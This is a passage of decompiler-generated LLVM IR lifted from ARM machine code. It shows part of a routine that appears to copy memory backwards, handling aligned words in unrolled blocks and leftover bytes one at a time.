  %v2_1255c = add i32 %v1_1255c, %v0_12310
  store i32 %v2_1255c, i32* @r1, align 4
  %v2_12560 = add i32 %v1_1255c, %v1_12310
  store i32 %v2_12560, i32* %r0.global-to-local, align 4
  %v2_12564 = add i32 %v1_1255c, -4
  store i32 %v2_12564, i32* %r2.global-to-local, align 4
  %v4_12564 = sub i32 3, %v1_1255c
  %v5_12564 = and i32 %v4_12564, %v1_1255c
  %v6_12564 = icmp slt i32 %v5_12564, 0
  store i1 %v6_12564, i1* %cpsr_v.global-to-local, align 1
  %v7_12564 = icmp slt i32 %v2_12564, 0
  store i1 %v7_12564, i1* %cpsr_n.global-to-local, align 1
  %v5_12568 = icmp slt i32 %v1_1255c, 4
  br i1 %v5_12568, label %bb143, label %dec_label_pc_1256c

dec_label_pc_1256c:                               ; preds = %dec_label_pc_1255c
  %v1_1256c = urem i32 %v2_12560, 4
  store i32 %v1_1256c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1256c = icmp eq i32 %v1_1256c, 0
  br i1 %v2_1256c, label %dec_label_pc_12574, label %dec_label_pc_12614

dec_label_pc_12574:                               ; preds = %dec_label_pc_1256c
  %v1_12574 = urem i32 %v2_1255c, 4
  store i32 %v1_12574, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12574 = icmp eq i32 %v1_12574, 0
  br i1 %v2_12574, label %dec_label_pc_1257c, label %dec_label_pc_12640

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12574, %dec_label_pc_12638
  %v0_1259449 = phi i32 [ %v2_12560, %dec_label_pc_12574 ], [ %v0_1268832, %dec_label_pc_12638 ]
  %v0_1259048 = phi i32 [ %v2_1255c, %dec_label_pc_12574 ], [ %v0_12638, %dec_label_pc_12638 ]
  %v0_1257c = phi i32 [ %v2_12564, %dec_label_pc_12574 ], [ %v2_12630, %dec_label_pc_12638 ]
  %v2_1257c = add i32 %v0_1257c, -8
  store i32 %v2_1257c, i32* %r2.global-to-local, align 4
  %v4_1257c = sub i32 7, %v0_1257c
  %v5_1257c = and i32 %v4_1257c, %v0_1257c
  %v6_1257c = icmp slt i32 %v5_1257c, 0
  store i1 %v6_1257c, i1* %cpsr_v.global-to-local, align 1
  %v7_1257c = icmp slt i32 %v2_1257c, 0
  store i1 %v7_1257c, i1* %cpsr_n.global-to-local, align 1
  %v5_12580 = icmp slt i32 %v0_1257c, 8
  br i1 %v5_12580, label %dec_label_pc_125cc, label %dec_label_pc_12584

dec_label_pc_12584:                               ; preds = %dec_label_pc_1257c
  %v3_12584 = load i32, i32* @r4, align 4
  %v5_12584 = inttoptr i32 %v3_12584 to i8*
  store i8* %v5_12584, i8** %stack_var_-8, align 4
  %v8_12584 = load i32, i32* @lr, align 4
  %v2_12588 = add i32 %v0_1257c, -28
  store i32 %v2_12588, i32* %r2.global-to-local, align 4
  %v4_12588 = sub i32 27, %v0_1257c
  %v5_12588 = and i32 %v4_12588, %v2_1257c
  %v6_12588 = icmp slt i32 %v5_12588, 0
  store i1 %v6_12588, i1* %cpsr_v.global-to-local, align 1
  %v7_12588 = icmp slt i32 %v2_12588, 0
  store i1 %v7_12588, i1* %cpsr_n.global-to-local, align 1
  %v5_1258c = icmp slt i32 %v2_1257c, 20
  br i1 %v5_1258c, label %dec_label_pc_125a8, label %dec_label_pc_12590

dec_label_pc_12590:                               ; preds = %dec_label_pc_12584, %dec_label_pc_12590.dec_label_pc_12590_crit_edge
  %v0_12594 = phi i32 [ %v1_1259c, %dec_label_pc_12590.dec_label_pc_12590_crit_edge ], [ %v0_1259449, %dec_label_pc_12584 ]
  %v0_12590 = phi i32 [ %v0_12590.pre, %dec_label_pc_12590.dec_label_pc_12590_crit_edge ], [ %v0_1259048, %dec_label_pc_12584 ]
  %v1_12590 = add i32 %v0_12590, -4
  %v2_12590 = inttoptr i32 %v1_12590 to i32*
  %v3_12590 = load i32, i32* %v2_12590, align 4
  store i32 %v3_12590, i32* %r3.global-to-local, align 4
  %v4_12590 = add i32 %v0_12590, -8
  %v5_12590 = inttoptr i32 %v4_12590 to i32*
  %v6_12590 = load i32, i32* %v5_12590, align 4
  store i32 %v6_12590, i32* %r4.global-to-local, align 4
  %v7_12590 = add i32 %v0_12590, -12
  %v8_12590 = inttoptr i32 %v7_12590 to i32*
  %v9_12590 = load i32, i32* %v8_12590, align 4
  store i32 %v9_12590, i32* %ip.global-to-local, align 4
  %v10_12590 = add i32 %v0_12590, -16
  %v11_12590 = inttoptr i32 %v10_12590 to i32*
  %v12_12590 = load i32, i32* %v11_12590, align 4
  store i32 %v12_12590, i32* %lr.global-to-local, align 4
  store i32 %v10_12590, i32* %r1.global-to-local, align 4
  %v1_12594 = add i32 %v0_12594, -16
  %v2_12594 = inttoptr i32 %v1_12594 to i32*
  store i32 %v3_12590, i32* %v2_12594, align 4
  %v4_12594 = add i32 %v0_12594, -12
  %v5_12594 = inttoptr i32 %v4_12594 to i32*
  %v6_12594 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_12594, i32* %v5_12594, align 4
  %v7_12594 = add i32 %v0_12594, -8
  %v8_12594 = inttoptr i32 %v7_12594 to i32*
  %v9_12594 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_12594, i32* %v8_12594, align 4
  %v10_12594 = add i32 %v0_12594, -4
  %v11_12594 = inttoptr i32 %v10_12594 to i32*
  %v12_12594 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12594, i32* %v11_12594, align 4
  store i32 %v1_12594, i32* %r0.global-to-local, align 4
  %v0_12598 = load i32, i32* %r1.global-to-local, align 4
  %v1_12598 = add i32 %v0_12598, -4
  %v2_12598 = inttoptr i32 %v1_12598 to i32*
  %v3_12598 = load i32, i32* %v2_12598, align 4
  store i32 %v3_12598, i32* %r3.global-to-local, align 4
  %v4_12598 = add i32 %v0_12598, -8
  %v5_12598 = inttoptr i32 %v4_12598 to i32*
  %v6_12598 = load i32, i32* %v5_12598, align 4
  store i32 %v6_12598, i32* %r4.global-to-local, align 4
  %v7_12598 = add i32 %v0_12598, -12
  %v8_12598 = inttoptr i32 %v7_12598 to i32*
  %v9_12598 = load i32, i32* %v8_12598, align 4
  store i32 %v9_12598, i32* @ip, align 4
  %v10_12598 = add i32 %v0_12598, -16
  %v11_12598 = inttoptr i32 %v10_12598 to i32*
  %v12_12598 = load i32, i32* %v11_12598, align 4
  store i32 %v12_12598, i32* %lr.global-to-local, align 4
  store i32 %v10_12598, i32* @r1, align 4
  %v1_1259c = add i32 %v0_12594, -32
  %v2_1259c = inttoptr i32 %v1_1259c to i32*
  store i32 %v3_12598, i32* %v2_1259c, align 4
  %v4_1259c = add i32 %v0_12594, -28
  %v5_1259c = inttoptr i32 %v4_1259c to i32*
  %v6_1259c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1259c, i32* %v5_1259c, align 4
  %v7_1259c = add i32 %v0_12594, -24
  %v8_1259c = inttoptr i32 %v7_1259c to i32*
  %v9_1259c = load i32, i32* @ip, align 4
  store i32 %v9_1259c, i32* %v8_1259c, align 4
  %v10_1259c = add i32 %v0_12594, -20
  %v11_1259c = inttoptr i32 %v10_1259c to i32*
  %v12_1259c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1259c, i32* %v11_1259c, align 4
  store i32 %v1_1259c, i32* %r0.global-to-local, align 4
  %v0_125a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_125a0 = add i32 %v0_125a0, -32
  store i32 %v2_125a0, i32* %r2.global-to-local, align 4
  %v6_125a4 = icmp slt i32 %v0_125a0, 32
  br i1 %v6_125a4, label %dec_label_pc_125a8.loopexit, label %dec_label_pc_12590.dec_label_pc_12590_crit_edge

dec_label_pc_12590.dec_label_pc_12590_crit_edge:  ; preds = %dec_label_pc_12590
  %v0_12590.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12590

dec_label_pc_125a8.loopexit:                      ; preds = %dec_label_pc_12590
  %v4_125a0 = sub i32 31, %v0_125a0
  %v5_125a0 = and i32 %v4_125a0, %v0_125a0
  %v6_125a0 = icmp slt i32 %v5_125a0, 0
  %v7_125a0 = icmp slt i32 %v2_125a0, 0
  store i1 %v6_125a0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_125a0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %dec_label_pc_125a8.loopexit, %dec_label_pc_12584
  %v6_125b0 = phi i32 [ %v1_1259c, %dec_label_pc_125a8.loopexit ], [ %v0_1259449, %dec_label_pc_12584 ]
  %v0_125b8.pr = phi i32 [ %v2_125a0, %dec_label_pc_125a8.loopexit ], [ %v2_12588, %dec_label_pc_12584 ]
  %v4_125a8 = add i32 %v0_125b8.pr, 16
  %v6_125a8 = sub i32 0, %v0_125b8.pr
  %v7_125a8 = and i32 %v4_125a8, %v6_125a8
  %v8_125a8 = icmp slt i32 %v7_125a8, 0
  store i1 %v8_125a8, i1* %cpsr_v.global-to-local, align 1
  %v9_125a8 = icmp slt i32 %v4_125a8, 0
  store i1 %v9_125a8, i1* %cpsr_n.global-to-local, align 1
  %v5_125ac = icmp slt i32 %v0_125b8.pr, -16
  br i1 %v5_125ac, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_125a8
  %v6_125ac = load i32, i32* @r1, align 4
  %v7_125ac = add i32 %v6_125ac, -4
  %v8_125ac = inttoptr i32 %v7_125ac to i32*
  %v9_125ac = load i32, i32* %v8_125ac, align 4
  store i32 %v9_125ac, i32* %r3.global-to-local, align 4
  %v10_125ac = add i32 %v6_125ac, -8
  %v11_125ac = inttoptr i32 %v10_125ac to i32*
  %v12_125ac = load i32, i32* %v11_125ac, align 4
  store i32 %v12_125ac, i32* %r4.global-to-local, align 4
  %v13_125ac = add i32 %v6_125ac, -12
  %v14_125ac = inttoptr i32 %v13_125ac to i32*
  %v15_125ac = load i32, i32* %v14_125ac, align 4
  store i32 %v15_125ac, i32* @ip, align 4
  %v16_125ac = add i32 %v6_125ac, -16
  %v17_125ac = inttoptr i32 %v16_125ac to i32*
  %v18_125ac = load i32, i32* %v17_125ac, align 4
  store i32 %v18_125ac, i32* %lr.global-to-local, align 4
  store i32 %v16_125ac, i32* @r1, align 4
  %v7_125b0 = add i32 %v6_125b0, -16
  %v8_125b0 = inttoptr i32 %v7_125b0 to i32*
  store i32 %v9_125ac, i32* %v8_125b0, align 4
  %v10_125b0 = add i32 %v6_125b0, -12
  %v11_125b0 = inttoptr i32 %v10_125b0 to i32*
  %v12_125b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_125b0, i32* %v11_125b0, align 4
  %v13_125b0 = add i32 %v6_125b0, -8
  %v14_125b0 = inttoptr i32 %v13_125b0 to i32*
  %v15_125b0 = load i32, i32* @ip, align 4
  store i32 %v15_125b0, i32* %v14_125b0, align 4
  %v16_125b0 = add i32 %v6_125b0, -4
  %v17_125b0 = inttoptr i32 %v16_125b0 to i32*
  %v18_125b0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_125b0, i32* %v17_125b0, align 4
  store i32 %v7_125b0, i32* %r0.global-to-local, align 4
  %v6_125b4 = load i32, i32* %r2.global-to-local, align 4
  %v7_125b4 = add i32 %v6_125b4, -16
  store i32 %v7_125b4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_125a8, %bb140
  %v6_125c0 = phi i32 [ %v7_125b0, %bb140 ], [ %v6_125b0, %dec_label_pc_125a8 ]
  %v0_125b8 = phi i32 [ %v7_125b4, %bb140 ], [ %v0_125b8.pr, %dec_label_pc_125a8 ]
  %v4_125b8 = add i32 %v0_125b8, 20
  store i32 %v4_125b8, i32* %r2.global-to-local, align 4
  %v6_125b8 = sub i32 0, %v0_125b8
  %v7_125b8 = and i32 %v4_125b8, %v6_125b8
  %v8_125b8 = icmp slt i32 %v7_125b8, 0
  store i1 %v8_125b8, i1* %cpsr_v.global-to-local, align 1
  %v9_125b8 = icmp slt i32 %v4_125b8, 0
  store i1 %v9_125b8, i1* %cpsr_n.global-to-local, align 1
  %v5_125bc = icmp slt i32 %v0_125b8, -20
  br i1 %v5_125bc, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_125bc = load i32, i32* @r1, align 4
  %v7_125bc = add i32 %v6_125bc, -4
  %v8_125bc = inttoptr i32 %v7_125bc to i32*
  %v9_125bc = load i32, i32* %v8_125bc, align 4
  store i32 %v9_125bc, i32* %r3.global-to-local, align 4
  %v10_125bc = add i32 %v6_125bc, -8
  %v11_125bc = inttoptr i32 %v10_125bc to i32*
  %v12_125bc = load i32, i32* %v11_125bc, align 4
  store i32 %v12_125bc, i32* @ip, align 4
  %v13_125bc = add i32 %v6_125bc, -12
  %v14_125bc = inttoptr i32 %v13_125bc to i32*
  %v15_125bc = load i32, i32* %v14_125bc, align 4
  store i32 %v15_125bc, i32* %lr.global-to-local, align 4
  store i32 %v13_125bc, i32* @r1, align 4
  %v7_125c0 = add i32 %v6_125c0, -12
  %v8_125c0 = inttoptr i32 %v7_125c0 to i32*
  store i32 %v9_125bc, i32* %v8_125c0, align 4
  %v10_125c0 = add i32 %v6_125c0, -8
  %v11_125c0 = inttoptr i32 %v10_125c0 to i32*
  %v12_125c0 = load i32, i32* @ip, align 4
  store i32 %v12_125c0, i32* %v11_125c0, align 4
  %v13_125c0 = add i32 %v6_125c0, -4
  %v14_125c0 = inttoptr i32 %v13_125c0 to i32*
  %v15_125c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_125c0, i32* %v14_125c0, align 4
  store i32 %v7_125c0, i32* %r0.global-to-local, align 4
  %v6_125c4 = load i32, i32* %r2.global-to-local, align 4
  %v7_125c4 = add i32 %v6_125c4, -12
  store i32 %v7_125c4, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_125e457 = phi i32 [ %v6_125c0, %.thread14 ], [ %v7_125c0, %bb141 ]
  %v0_125cc55 = phi i32 [ %v4_125b8, %.thread14 ], [ %v7_125c4, %bb141 ]
  %v2_125c8 = load i8*, i8** %stack_var_-8, align 4
  %v3_125c8 = ptrtoint i8* %v2_125c8 to i32
  store i32 %v3_125c8, i32* @r4, align 4
  store i32 %v8_12584, i32* @lr, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125cc:                               ; preds = %dec_label_pc_1257c, %.thread16
  %v7_125dc = phi i32 [ %v0_1259449, %dec_label_pc_1257c ], [ %v6_125e457, %.thread16 ]
  %v0_125cc = phi i32 [ %v2_1257c, %dec_label_pc_1257c ], [ %v0_125cc55, %.thread16 ]
  %v2_125cc = add i32 %v0_125cc, 8
  store i32 %v2_125cc, i32* %r2.global-to-local, align 4
  %v4_125cc = sub i32 0, %v0_125cc
  %v5_125cc = and i32 %v2_125cc, %v4_125cc
  %v6_125cc = icmp slt i32 %v5_125cc, 0
  store i1 %v6_125cc, i1* %cpsr_v.global-to-local, align 1
  %v7_125cc = icmp slt i32 %v2_125cc, 0
  store i1 %v7_125cc, i1* %cpsr_n.global-to-local, align 1
  %v5_125d0 = icmp slt i32 %v0_125cc, -8
  br i1 %v5_125d0, label %bb143, label %dec_label_pc_125d4

dec_label_pc_125d4:                               ; preds = %dec_label_pc_125cc
  %v6_125d4 = add i32 %v0_125cc, 4
  store i32 %v6_125d4, i32* %r2.global-to-local, align 4
  %v8_125d4 = sub i32 -5, %v0_125cc
  %v9_125d4 = and i32 %v8_125d4, %v2_125cc
  %v10_125d4 = icmp slt i32 %v9_125d4, 0
  store i1 %v10_125d4, i1* %cpsr_v.global-to-local, align 1
  %v11_125d4 = icmp slt i32 %v6_125d4, 0
  store i1 %v11_125d4, i1* %cpsr_n.global-to-local, align 1
  %v5_125d8 = icmp slt i32 %v2_125cc, 4
  %v6_125d8 = load i32, i32* @r1, align 4
  %v7_125d8 = add i32 %v6_125d8, -4
  %v8_125d8 = inttoptr i32 %v7_125d8 to i32*
  %v9_125d8 = load i32, i32* %v8_125d8, align 4
  store i32 %v9_125d8, i32* %r3.global-to-local, align 4
  br i1 %v5_125d8, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_125d4
  store i32 %v7_125d8, i32* @r1, align 4
  %v8_125dc = add i32 %v7_125dc, -4
  %v9_125dc = inttoptr i32 %v8_125dc to i32*
  store i32 %v9_125d8, i32* %v9_125dc, align 4
  %v10_125dc = load i32, i32* %r0.global-to-local, align 4
  %v11_125dc = add i32 %v10_125dc, -4
  store i32 %v11_125dc, i32* %r0.global-to-local, align 4
  %v0_125ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_125d4
  %v10_125e0 = add i32 %v6_125d8, -8
  %v11_125e0 = inttoptr i32 %v10_125e0 to i32*
  %v12_125e0 = load i32, i32* %v11_125e0, align 4
  store i32 %v12_125e0, i32* @ip, align 4
  store i32 %v10_125e0, i32* @r1, align 4
  %v7_125e4 = add i32 %v7_125dc, -8
  %v8_125e4 = inttoptr i32 %v7_125e4 to i32*
  store i32 %v9_125d8, i32* %v8_125e4, align 4
  %v10_125e4 = add i32 %v7_125dc, -4
  %v11_125e4 = inttoptr i32 %v10_125e4 to i32*
  %v12_125e4 = load i32, i32* @ip, align 4
  store i32 %v12_125e4, i32* %v11_125e4, align 4
  store i32 %v7_125e4, i32* %r0.global-to-local, align 4
  %v6_125e8 = load i32, i32* %r2.global-to-local, align 4
  %v7_125e8 = add i32 %v6_125e8, -4
  store i32 %v7_125e8, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_125cc, %dec_label_pc_1255c, %dec_label_pc_12790, %dec_label_pc_12724, %dec_label_pc_126b8, %bb142
  %v2_125f0 = phi i32 [ %v11_125dc, %.thread20 ], [ %v0_1268832, %.thread26 ], [ %v7_125dc, %dec_label_pc_125cc ], [ %v2_12560, %dec_label_pc_1255c ], [ %v2_125fc65, %dec_label_pc_12790 ], [ %v2_125fc64, %dec_label_pc_12724 ], [ %v2_125fc63, %dec_label_pc_126b8 ], [ %v7_125e4, %bb142 ]
  %v0_125ec = phi i32 [ %v0_125ec.pre, %.thread20 ], [ %v2_12630, %.thread26 ], [ %v2_125cc, %dec_label_pc_125cc ], [ %v2_12564, %dec_label_pc_1255c ], [ %v0_125ec61, %dec_label_pc_12790 ], [ %v0_125ec60, %dec_label_pc_12724 ], [ %v0_125ec59, %dec_label_pc_126b8 ], [ %v7_125e8, %bb142 ]
  %v1_125ec = add i32 %v0_125ec, 4
  store i32 %v1_125ec, i32* @r2, align 4
  %v3_125ec = sub i32 0, %v0_125ec
  %v4_125ec = and i32 %v1_125ec, %v3_125ec
  %v5_125ec = icmp slt i32 %v4_125ec, 0
  store i1 %v5_125ec, i1* %cpsr_v.global-to-local, align 1
  %v6_125ec = icmp slt i32 %v1_125ec, 0
  store i1 %v6_125ec, i1* %cpsr_n.global-to-local, align 1
  %v7_125ec = icmp eq i32 %v1_125ec, 0
  store i1 %v7_125ec, i1* @cpsr_z, align 1
  br i1 %v7_125ec, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_125f4 = add i32 %v0_125ec, 2
  %v3_125f4 = sub i32 -3, %v0_125ec
  %v4_125f4 = and i32 %v3_125f4, %v1_125ec
  %v5_125f4 = icmp slt i32 %v4_125f4, 0
  store i1 %v5_125f4, i1* %cpsr_v.global-to-local, align 1
  %v6_125f4 = icmp slt i32 %v1_125f4, 0
  store i1 %v6_125f4, i1* %cpsr_n.global-to-local, align 1
  %v7_125f4 = icmp eq i32 %v1_125ec, 2
  store i1 %v7_125f4, i1* @cpsr_z, align 1
  %v0_125f8 = load i32, i32* @r1, align 4
  %v1_125f8 = add i32 %v0_125f8, -1
  %v2_125f8 = inttoptr i32 %v1_125f8 to i8*
  %v3_125f8 = load i8, i8* %v2_125f8, align 1
  %v4_125f8 = zext i8 %v3_125f8 to i32
  store i32 %v4_125f8, i32* %r3.global-to-local, align 4
  store i32 %v1_125f8, i32* @r1, align 4
  %v3_125fc = add i32 %v2_125f0, -1
  %v4_125fc = inttoptr i32 %v3_125fc to i8*
  store i8 %v3_125f8, i8* %v4_125fc, align 1
  %v5_125fc = load i32, i32* %r0.global-to-local, align 4
  %v6_125fc = add i32 %v5_125fc, -1
  store i32 %v6_125fc, i32* %r0.global-to-local, align 4
  %v0_12600 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_12600 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_12600 = xor i1 %v0_12600, %v1_12600
  br i1 %v2_12600, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_12600 = load i32, i32* @r1, align 4
  %v4_12600 = add i32 %v3_12600, -1
  %v5_12600 = inttoptr i32 %v4_12600 to i8*
  %v6_12600 = load i8, i8* %v5_12600, align 1
  %v7_12600 = zext i8 %v6_12600 to i32
  store i32 %v7_12600, i32* %r3.global-to-local, align 4
  store i32 %v4_12600, i32* @r1, align 4
  %v6_12604 = add i32 %v5_125fc, -2
  %v7_12604 = inttoptr i32 %v6_12604 to i8*
  store i8 %v6_12600, i8* %v7_12604, align 1
  %v8_12604 = load i32, i32* %r0.global-to-local, align 4
  %v9_12604 = add i32 %v8_12604, -1
  store i32 %v9_12604, i32* %r0.global-to-local, align 4
  %v1_12608.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_12608.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_1260c = phi i32 [ %v9_12604, %bb145 ], [ %v6_125fc, %bb144 ]
  %v2_1260c = phi i1 [ %v2_12608.pre, %bb145 ], [ %v1_12600, %bb144 ]
  %v1_1260c = phi i1 [ %v1_12608.pre, %bb145 ], [ %v0_12600, %bb144 ]
  %v0_12608 = load i1, i1* @cpsr_z, align 1
  %v3_12608 = xor i1 %v2_1260c, %v1_1260c
  %v4_12608 = or i1 %v0_12608, %v3_12608
  br i1 %v4_12608, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_12608 = load i32, i32* @r1, align 4
  %v6_12608 = add i32 %v5_12608, -1
  %v7_12608 = inttoptr i32 %v6_12608 to i8*
  %v8_12608 = load i8, i8* %v7_12608, align 1
  %v9_12608 = zext i8 %v8_12608 to i32
  store i32 %v9_12608, i32* %r3.global-to-local, align 4
  store i32 %v6_12608, i32* @r1, align 4
  %v8_1260c = add i32 %v7_1260c, -1
  %v9_1260c = inttoptr i32 %v8_1260c to i8*
  store i8 %v8_12608, i8* %v9_1260c, align 1
  %v10_1260c = load i32, i32* %r0.global-to-local, align 4
  %v11_1260c = add i32 %v10_1260c, -1
  store i32 %v11_1260c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_12614:                               ; preds = %dec_label_pc_1256c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_12614 = icmp eq i32 %v1_1256c, 1
  store i1 %v8_12614, i1* %cpsr_n.global-to-local, align 1
  %v1_12618 = add i32 %v2_1255c, -1
  %v2_12618 = inttoptr i32 %v1_12618 to i8*
  %v3_12618 = load i8, i8* %v2_12618, align 1
  %v4_12618 = zext i8 %v3_12618 to i32
  store i32 %v4_12618, i32* %r3.global-to-local, align 4
  store i32 %v1_12618, i32* @r1, align 4
  %v3_1261c = add i32 %v2_12560, -1
  %v4_1261c = inttoptr i32 %v3_1261c to i8*
  store i8 %v3_12618, i8* %v4_1261c, align 1
  %v5_1261c = load i32, i32* %r0.global-to-local, align 4
  %v6_1261c = add i32 %v5_1261c, -1
  store i32 %v6_1261c, i32* %r0.global-to-local, align 4
  br i1 %v8_12614, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_12614
  %v9_12614 = icmp eq i32 %v1_1256c, 2
  %v6_12620 = load i32, i32* @r1, align 4
  %v7_12620 = add i32 %v6_12620, -1
  %v8_12620 = inttoptr i32 %v7_12620 to i8*
  %v9_12620 = load i8, i8* %v8_12620, align 1
  %v10_12620 = zext i8 %v9_12620 to i32
  store i32 %v10_12620, i32* %r3.global-to-local, align 4
  store i32 %v7_12620, i32* @r1, align 4
  %v9_12624 = add i32 %v5_1261c, -2
  %v10_12624 = inttoptr i32 %v9_12624 to i8*
  store i8 %v9_12620, i8* %v10_12624, align 1
  %v11_12624 = load i32, i32* %r0.global-to-local, align 4
  %v12_12624 = add i32 %v11_12624, -1
  store i32 %v12_12624, i32* %r0.global-to-local, align 4
  br i1 %v9_12614, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_12628 = load i32, i32* @r1, align 4
  %v9_12628 = add i32 %v8_12628, -1
  %v10_12628 = inttoptr i32 %v9_12628 to i8*
  %v11_12628 = load i8, i8* %v10_12628, align 1
  %v12_12628 = zext i8 %v11_12628 to i32
  store i32 %v12_12628, i32* %r3.global-to-local, align 4
  store i32 %v9_12628, i32* @r1, align 4
  %v11_1262c = add i32 %v11_12624, -2
  %v12_1262c = inttoptr i32 %v11_1262c to i8*
  store i8 %v11_12628, i8* %v12_1262c, align 1
  %v13_1262c = load i32, i32* %r0.global-to-local, align 4
  %v14_1262c = add i32 %v13_1262c, -1
  store i32 %v14_1262c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_12614, %bb148
  %v0_1268832 = phi i32 [ %v12_12624, %bb147 ], [ %v6_1261c, %dec_label_pc_12614 ], [ %v14_1262c, %bb148 ]
  %v0_12630 = load i32, i32* %r2.global-to-local, align 4
  %v1_12630 = load i32, i32* @ip, align 4
  %v2_12630 = sub i32 %v0_12630, %v1_12630
  store i32 %v2_12630, i32* %r2.global-to-local, align 4
  %v4_12630 = xor i32 %v1_12630, %v0_12630
  %v5_12630 = xor i32 %v2_12630, %v0_12630
  %v6_12630 = and i32 %v5_12630, %v4_12630
  %v7_12630 = icmp slt i32 %v6_12630, 0
  store i1 %v7_12630, i1* %cpsr_v.global-to-local, align 1
  %v8_12630 = icmp slt i32 %v2_12630, 0
  store i1 %v8_12630, i1* %cpsr_n.global-to-local, align 1
  %v5_12634 = icmp slt i32 %v0_12630, %v1_12630
  br i1 %v5_12634, label %bb143, label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %.thread26
  %v0_12638 = load i32, i32* @r1, align 4
  %v1_12638 = urem i32 %v0_12638, 4
  store i32 %v1_12638, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12638 = icmp eq i32 %v1_12638, 0
  br i1 %v2_12638, label %dec_label_pc_1257c, label %dec_label_pc_12640

dec_label_pc_12640:                               ; preds = %dec_label_pc_12574, %dec_label_pc_12638
  %v0_1268831 = phi i32 [ %v2_12560, %dec_label_pc_12574 ], [ %v0_1268832, %dec_label_pc_12638 ]
  %v0_12734 = phi i32 [ %v2_12564, %dec_label_pc_12574 ], [ %v2_12630, %dec_label_pc_12638 ]
  %v0_12640 = phi i32 [ %v2_1255c, %dec_label_pc_12574 ], [ %v0_12638, %dec_label_pc_12638 ]
  %v0_12648 = phi i32 [ %v1_12574, %dec_label_pc_12574 ], [ %v1_12638, %dec_label_pc_12638 ]
  %v1_12640 = and i32 %v0_12640, -4
  store i32 %v1_12640, i32* %r1.global-to-local, align 4
  %v1_12644 = inttoptr i32 %v1_12640 to i32*
  %v2_12644 = load i32, i32* %v1_12644, align 4
  store i32 %v2_12644, i32* %r3.global-to-local, align 4
  %v7_12648 = icmp ult i32 %v0_12648, 2
  %v2_1272c = add i32 %v0_12734, -12
  %v4_1272c = sub i32 11, %v0_12734
  %v5_1272c = and i32 %v4_1272c, %v0_12734
  %v6_1272c = icmp slt i32 %v5_1272c, 0
  store i1 %v6_1272c, i1* %cpsr_v.global-to-local, align 1
  %v7_1272c = icmp slt i32 %v2_1272c, 0
  store i1 %v7_1272c, i1* %cpsr_n.global-to-local, align 1
  %v5_12730 = icmp slt i32 %v0_12734, 12
  br i1 %v7_12648, label %dec_label_pc_1272c, label %dec_label_pc_12650

dec_label_pc_12650:                               ; preds = %dec_label_pc_12640
  %v8_12648 = icmp eq i32 %v0_12648, 2
  br i1 %v8_12648, label %dec_label_pc_126c0, label %dec_label_pc_12654

dec_label_pc_12654:                               ; preds = %dec_label_pc_12650
  br i1 %v5_12730, label %dec_label_pc_126a0, label %dec_label_pc_1265c

dec_label_pc_1265c:                               ; preds = %dec_label_pc_12654
  store i32 %v2_1272c, i32* %r2.global-to-local, align 4
  %v3_12660 = load i32, i32* @r4, align 4
  store i32 %v3_12660, i32* %stack_var_-12, align 4
  %v6_12660 = load i32, i32* @r5, align 4
  %v8_12660 = inttoptr i32 %v6_12660 to i8*
  store i8* %v8_12660, i8** %stack_var_-8, align 4
  %v11_12660 = load i32, i32* @lr, align 4
  br label %dec_label_pc_12664

dec_label_pc_12664:                               ; preds = %dec_label_pc_12664.dec_label_pc_12664_crit_edge, %dec_label_pc_1265c
  %v0_12688 = phi i32 [ %v1_12688, %dec_label_pc_12664.dec_label_pc_12664_crit_edge ], [ %v0_1268831, %dec_label_pc_1265c ]
  %v0_12668 = phi i32 [ %v0_12668.pre, %dec_label_pc_12664.dec_label_pc_12664_crit_edge ], [ %v1_12640, %dec_label_pc_1265c ]
  %v0_12664 = phi i32 [ %v0_12664.pre, %dec_label_pc_12664.dec_label_pc_12664_crit_edge ], [ %v2_12644, %dec_label_pc_1265c ]
  %v3_12664 = mul i32 %v0_12664, 256
  store i32 %v3_12664, i32* %lr.global-to-local, align 4
  %v1_12668 = add i32 %v0_12668, -4
  %v2_12668 = inttoptr i32 %v1_12668 to i32*
  %v3_12668 = load i32, i32* %v2_12668, align 4
